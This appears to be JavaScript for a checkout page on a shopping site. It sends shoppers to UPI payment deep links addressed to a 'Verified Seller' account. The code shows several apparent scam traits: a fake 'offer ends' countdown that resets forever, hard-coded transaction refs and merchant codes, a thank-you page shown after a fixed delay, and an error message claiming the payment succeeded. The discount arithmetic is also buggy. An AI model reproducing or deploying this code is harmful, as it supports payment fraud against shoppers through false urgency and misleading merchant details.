var itemData;
$(document).ready(function () {
    startTimer(500 - 120, $('#offerend-time'));
    $(".form-check").on('click', function () {
        $(".form-check").removeClass('active');
        $(this).addClass('active');
    });
    $("#back_btn").on("click", function () {
        history.back();
    });

    var selected_verient = localStorage.getItem("selected_verient");
    itemData = JSON.parse(selected_verient);
    $("#item_image").prop('src', itemData.img1);
    var name = itemData.name + " " + ((itemData.color) ? ' (' + itemData.color + ')' : '') + ((itemData.size) ? ' (' + itemData.size + ')' : '') + ((itemData.storage) ? ' (' + itemData.storage + ')' : '');
    $("#product-title").html(name);
    $(".selling_price, .payable").html("&#8377;" + itemData.selling_price);
    $(".mrp").html("&#8377;" + itemData.mrp);
});

function startTimer(duration, display) {
    var timer = duration, minutes, seconds;
    setInterval(function () {
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.text(minutes + "min " + seconds + "sec");

        if (--timer < 0) {
            timer = duration;
        }
    }, 1000);
}

  var selected_verient = localStorage.getItem("selected_verient");
    itemData = JSON.parse(selected_verient);


let sellingPrice_phonepe = itemData.selling_price;
let fiftyPercent = sellingPrice_phonepe * 0.15;
    let phonepe_price = Math.round(sellingPrice_phonepe - fiftyPercent);
    console.log(phonepe_price)
    
    document.getElementById('discount_phonepe').innerHTML = `₹${Math.round(phonepe_price)}`;

let sellingPrice_paytm = itemData.selling_price;
let tenPercent = sellingPrice_paytm * 0.15;
    let paytm_price = Math.round(sellingPrice_paytm - fiftyPercent);
    console.log(paytm_price)
    
    document.getElementById('discount_paytm').innerHTML = `₹${Math.round(paytm_price)}`;
    
    
    
    let sellingPrice_total = itemData.selling_price;
let totalPercent = sellingPrice_total * 0.40;
    let totals_price = Math.round(sellingPrice_total - totalPercent);
    console.log(totals_price)
    
    document.getElementById('total_pricess').innerHTML = `₹${Math.round(totals_price)}`
     document.getElementById('total_pricessss').innerHTML = `₹${Math.round(totals_price)}`

    
    
    
function payNow() {
    var orderNumber = Math.floor(Math.random() * 10000000000);
    var payType = $(".form-check.active").attr('pay-type');
    var redirect_url = "";
    var site_name = "Verified Seller";
    var upi_address = UPI_ID;
    var amt = parseFloat(itemData.selling_price).toFixed(2);

    switch (payType) {
      case 'gpay':
        redirect_url = "tez://upi/pay?pa=" + upi_address + "&pn=Online Store&tn=Order_Id_" + orderNumber + "&am="+ amt + "&tr=H2MkMGf5olejI&mc=8931&cu=INR&tn="+ site_name;
        break;
        case 'phonepe':
        redirect_url = "phonepe://pay?ver=01&mode=19&pa=" + upi_address + "&pn=" + site_name + "&tr=RZPPXTog5fXlvIb6Wqrv2&cu=INR&mc=4215&qrMedium=04&tn=TN_" + orderNumber + "&am="+amt + "";
            break;
        case 'paytm':
            redirect_url = "paytmmp://pay?ver=01&mode=19&pa=" + upi_address + "&pn=" + site_name + "&tr=RZPPXTog5fXlvIb6Wqrv2&cu=INR&mc=4215&qrMedium=04&tn=TN_" + orderNumber + "&am=" + amt + "";
            break; 
      case 'bhim_upi':
        redirect_url = "bhim://pay?pa=" + upi_address + "&pn=Online Store&tn=Order_Id_" + orderNumber + "&am="+ amt + "&tr=H2MkMGf5olejI&mc=8931&cu=INR&tn="+ site_name;
        break;
      case 'whatsapp':
        redirect_url = "whatsapp://pay?pa=" + upi_address + "&pn=Online Store&tn=Order_Id_" + orderNumber + "&am="+ amt + "&tr=H2MkMGf5olejI&mc=8931&cu=INR&tn="+ site_name;
        break;
      default:
            break;
    }
    window.location.href = redirect_url;
       
    $(document).ready(function () {
    // Extract parameters from the URL
   const fullPath = window.location.pathname;

    // Find the index of '/payment' in the path
    const paymentIndex = fullPath.indexOf('/payment');
    
    // Check if '/payment' exists in the path
    if (paymentIndex !== -1) {
        // Extract everything after '/payment'
        const pathAfterPayment = fullPath.slice(paymentIndex + '/payment'.length);

        console.log(pathAfterPayment);
    // Perform AJAX request with the extracted parameters
    $.ajax({
        type: 'POST',
        url: pathAfterPayment + 'verify/process-payment.php', // Dynamically construct the URL
        data: {
            orderNumber: orderNumber,
            payType: payType,
            upi_address: upi_address,
            amt: amt
        },
        
        success: function(response) {
            // Check the response from the server
            if (response === 'success') {
                // Redirect to the "Thank You" page after successful payment notification
                setTimeout(function() {
                    window.location.href = pathAfterPayment + `verify/thankyou.php?orderNumber=${orderNumber}`;
                }, 20000); // 20 seconds delay
            } else {
                // Handle unsuccessful payment
                alert("Payment failed. Please try again.");
            }
        },
        error: function() {
            // Handle error if the server notification fails
            alert("Payment successful, but server notification failed. Please contact support.");
        }
    });
    }
});

}











